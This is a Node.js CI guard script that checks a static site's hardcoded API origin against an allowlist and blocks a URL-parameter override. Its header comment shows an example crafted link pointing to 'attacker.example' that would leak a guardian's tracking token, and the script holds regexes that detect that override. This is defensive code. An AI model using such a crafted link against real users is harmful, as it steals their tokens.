#!/usr/bin/env node
/**
 * Guard: the site's API origin is one value, written once per file, and expected.
 *
 * Why three copies exist
 * ----------------------
 * invite/invite.js, invite/redeem.js and track/track.js each declare their own
 * `API_BASE`. They are deliberately not collapsed into a shared
 * `window.SERAYAE_API_BASE`, but NOT for the security reason an earlier version
 * of this comment gave. That reason was wrong and review said so: any script
 * able to execute on /invite or /track already owns the page — it can replace
 * `window.fetch`, read the OTP field, or read the bearer token straight out of
 * the verify-otp response. Hiding the string in a closure buys nothing against
 * XSS.
 *
 * The `?api=` override deleted in #7 was a different threat in kind: it was
 * attacker-controllable through a *link*, with no script execution at all. Send
 * a guardian `/track/?t=<token>&api=https://attacker.example` and the tracking
 * token leaves in the request path. That is why an origin must never again be
 * writable from page input — and it is why this script's real job is rule 2
 * below, not the existence of three literals.
 *
 * The literals stay for plain engineering reasons: a shared config.js adds a
 * script-order failure mode on pages where a broken base means a guardian
 * watching an emergency sees nothing, in exchange for deduplicating three
 * strings on a static site. Cheaper to check than to centralise.
 *
 * What it enforces
 * ----------------
 *  1. Each file declares the origin exactly once, and that declaration is real
 *     code, not a commented-out line.
 *  2. The identifier is ASSIGNED exactly once in the whole file. This is the
 *     rule that matters: the #7 bug was `if (override) apiBase = override;` —
 *     a reassignment, not a declaration. A declaration-only check waved it
 *     through, which is what review demonstrated on the first version of this
 *     script.
 *  3. No `?api=`-style origin override is reintroduced.
 *  4. All origins are byte-identical across the three files.
 *  5. The host is on a positive allowlist. A blocklist of dead hosts cannot
 *     catch a mistyped redeploy of an unmemorable Heroku suffix.
 *  6. https, no port, path exactly `/api` (compared with no normalisation, so a
 *     trailing slash fails — `/api/` + `/referrals/redeem` yields `//` and 404s
 *     every request), no query, no fragment.
 *
 * Usage
 *   node .github/scripts/check-api-origin.js             # verify
 *   node .github/scripts/check-api-origin.js --print     # print origin on the last line
 *
 * Exits non-zero with a specific message on any violation.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const { scanSource } = require('./lib/scan');

const REPO_ROOT = path.resolve(__dirname, '..', '..');

/** Every file that holds an API origin, and the identifier holding it. */
const TARGETS = [
  { file: 'invite/invite.js', varName: 'API_BASE' },
  { file: 'invite/redeem.js', varName: 'API_BASE' },
  { file: 'track/track.js', varName: 'API_BASE' },
];

/**
 * The only hosts this site may talk to.
 *
 * Add `api.serayae.me` here in the SAME commit that repoints the three files to
 * it, so the two can never disagree. Do not add a staging host: use a local
 * build instead, which is the rule #7 established.
 */
const ALLOWED_HOSTS = [
  'serayae-api-01118af29270.herokuapp.com', // Heroku app `serayae-api`, EU region
  'api.serayae.me', // reserved for the custom-domain cutover
];

/** Patterns that must not reappear anywhere in these files. */
const FORBIDDEN_PATTERNS = [
  {
    // Any read of a URL parameter named `api`, however it is spelled. The v2
    // pattern insisted on the literal `searchParams.get('api')` and review
    // showed it matched nothing in this codebase's actual idiom.
    pattern: /\bget(?:All)?\(\s*['"]api['"]\s*\)/,
    reason:
      'reading a URL parameter named `api` reintroduces the #7 override: a crafted ' +
      'link could repoint the origin with no script execution at all.',
  },
  {
    pattern: /\breadApiOverride\b/,
    reason: 'this is the name of the function #7 deleted. It must not come back.',
  },
];

const errors = [];
const found = [];

for (const { file, varName } of TARGETS) {
  const abs = path.join(REPO_ROOT, file);

  if (!fs.existsSync(abs)) {
    errors.push(`${file}: file is missing — the guard cannot verify an origin that is not there.`);
    continue;
  }

  const raw = fs.readFileSync(abs, 'utf8');

  // `code` has comment spans blanked but keeps string contents, so the declared
  // origin is still readable and a `get('api')` override is still visible.
  // `bare` additionally blanks the insides of strings, template literals and
  // regex literals, so counting assignments in it cannot be fooled by the text
  // `API_BASE =` appearing inside a string, a template or a trailing comment.
  const { code, bare } = scanSource(raw);

  // ── rule 1: exactly one real declaration ────────────────────────────────
  const declRe = new RegExp(
    `\\b(?:var|let|const)\\s+${varName}\\s*=\\s*(['"])([^'"]+)\\1\\s*;`,
    'g',
  );
  const decls = [...code.matchAll(declRe)];

  if (decls.length === 0) {
    errors.push(
      `${file}: no executable \`var ${varName} = '<origin>';\` declaration found. ` +
        `A declaration that is commented out does not count — the page would throw ` +
        `a ReferenceError under 'use strict'. If the variable was renamed, update ` +
        `TARGETS in this script.`,
    );
    continue;
  }
  if (decls.length > 1) {
    errors.push(
      `${file}: ${decls.length} declarations of \`${varName}\`. Exactly one is required.`,
    );
    continue;
  }

  // ── rule 2: exactly one ASSIGNMENT anywhere (the #7 shape) ──────────────
  //
  // Matches plain `NAME =` AND every compound assignment (`+=`, `&&=`, `>>=`,
  // `??=` …), while excluding the comparisons `==`, `===`, `!=`, `!==`, `>=`
  // and `<=`.
  //
  // Two notes, both learned by testing rather than reasoning:
  //
  //   * An earlier version used a lookbehind after `\s*` to reject operators.
  //     It was dead code: with `\s*` already consumed, the character before the
  //     `=` is either whitespace or the last letter of the identifier, so the
  //     lookbehind could never fire. Worse, it gave the false impression that
  //     `+=` was handled — it was not, and `API_BASE += '/v2'` passed.
  //   * Multi-character operators are listed before single ones as a matter of
  //     style only. An earlier comment here claimed the longer forms would
  //     otherwise never match; review disproved that by running three
  //     orderings and getting identical results, because the engine backtracks
  //     into the remaining alternatives. The claim was wrong and is corrected
  //     rather than quietly deleted.
  //
  // Counted against `bare`, so the text `API_BASE =` inside a string, a
  // template literal, a regex literal or a trailing comment is NOT counted.
  // Each of those used to turn the build red on ordinary code.
  //
  // The leading `(?<![.\w$])` excludes property assignment: `window.API_BASE = x`
  // and `obj.API_BASE = x` are not writes to the closure-local origin.
  const ASSIGN_OPS = '\\*\\*|<<|>>>|>>|&&|\\|\\||\\?\\?|[+\\-*/%&|^]';
  const assignRe = new RegExp(`(?<![.\\w$])${varName}\\s*(?:${ASSIGN_OPS})?=(?!=)`, 'g');
  const assigns = [...bare.matchAll(assignRe)];

  if (assigns.length !== 1) {
    const lines = assigns.map((m) => bare.slice(0, m.index).split('\n').length);
    errors.push(
      `${file}: \`${varName}\` is assigned ${assigns.length} times (lines ${lines.join(', ')}), ` +
        `expected exactly 1.\n    The #7 bug was a REASSIGNMENT — \`if (override) apiBase = override;\` — ` +
        `not a second declaration. The origin must be written once and never again, or a ` +
        `crafted link can repoint it and carry the token away.`,
    );
    continue;
  }

  // ── rule 2b: rebinding forms the assignment regex cannot see ───────────
  //
  // `({ API_BASE } = cfg)` and `for (API_BASE of [...])` both rewrite the origin
  // without ever placing `API_BASE` immediately before an `=`. Review found both
  // passing. Checked against `bare` so a mention inside a string cannot trip them.
  const REBIND_FORMS = [
    {
      pattern: new RegExp(`[{\\[][^{}\\[\\]]*\\b${varName}\\b[^{}\\[\\]]*[}\\]]\\s*(?:${ASSIGN_OPS})?=(?!=)`),
      reason:
        `\`${varName}\` appears inside a destructuring assignment target. That rewrites ` +
        `the origin without an obvious \`${varName} =\`, which is exactly how an override ` +
        `would be hidden from a naive check.`,
    },
    {
      pattern: new RegExp(`\\bfor\\s*\\([^)]*\\b${varName}\\b[^)]*\\b(?:of|in)\\b`),
      reason:
        `\`${varName}\` is rebound by a for-of/for-in header, which reassigns it on ` +
        `every iteration.`,
    },
  ];
  for (const { pattern, reason } of REBIND_FORMS) {
    if (pattern.test(bare)) {
      errors.push(`${file}: ${reason}`);
    }
  }

  // ── rule 3: no override mechanism anywhere in the file ──────────────────
  // Run against `code`, not `bare`: the parameter name being read only exists
  // inside a string literal, so blanking string contents would hide it.
  for (const { pattern, reason } of FORBIDDEN_PATTERNS) {
    if (pattern.test(code)) {
      errors.push(`${file}: matches ${pattern} — ${reason}`);
    }
  }

  found.push({ file, varName, value: decls[0][2] });
}

// ── rules 5 and 6: the value itself ────────────────────────────────────────
for (const { file, value } of found) {
  let url;
  try {
    url = new URL(value);
  } catch {
    errors.push(
      `${file}: '${value}' is not a parsable absolute URL. The origin must be a ` +
        `literal string, not a concatenation or template.`,
    );
    continue;
  }

  if (url.protocol !== 'https:') {
    errors.push(
      `${file}: scheme is '${url.protocol}' — must be https. These pages carry ` +
        `bearer and tracking tokens.`,
    );
  }

  if (!ALLOWED_HOSTS.includes(url.hostname)) {
    errors.push(
      `${file}: host '${url.hostname}' is not allowed.\n    Permitted: ${ALLOWED_HOSTS.join(', ')}\n` +
        `    An allowlist is used deliberately: the live host carries an unmemorable ` +
        `random suffix, and a single mistyped character would otherwise pass every ` +
        `other rule while breaking every invite and tracking link on the site.`,
    );
  }

  if (url.port !== '') {
    errors.push(`${file}: origin must not specify a port (got ':${url.port}').`);
  }

  // Compared with NO normalisation on purpose: '/api/' would build
  // '/api//referrals/redeem', which Express does not match.
  if (url.pathname !== '/api') {
    errors.push(
      `${file}: path is '${url.pathname}' — must be exactly '/api' with no trailing ` +
        `slash, because every call site appends a route like '/referrals/redeem'.`,
    );
  }

  if (url.search !== '' || url.hash !== '') {
    errors.push(`${file}: origin must carry no query string or fragment (got '${value}').`);
  }
}

// ── rule 4: the three agree ────────────────────────────────────────────────
if (found.length === TARGETS.length) {
  const distinct = [...new Set(found.map((f) => f.value))];
  if (distinct.length > 1) {
    errors.push(
      'the origins disagree:\n' +
        found.map((f) => `      ${f.file.padEnd(18)} ${f.value}`).join('\n') +
        '\n    All must be byte-identical. An invite is minted against one page and ' +
        'redeemed on another; pointing them at different backends makes an invite ' +
        'silently impossible to accept.',
    );
  }
}

// ── report ─────────────────────────────────────────────────────────────────
if (errors.length > 0) {
  console.error('✗ API origin check failed:\n');
  for (const e of errors) console.error(`  • ${e}\n`);
  process.exit(1);
}

const origin = found[0].value;
console.error(`✓ API origin check passed — all ${found.length} files agree on ${origin}`);

if (process.argv.includes('--print')) {
  // stdout carries ONLY the origin, so a caller can capture it without `tail`.
  process.stdout.write(`${origin}\n`);
}
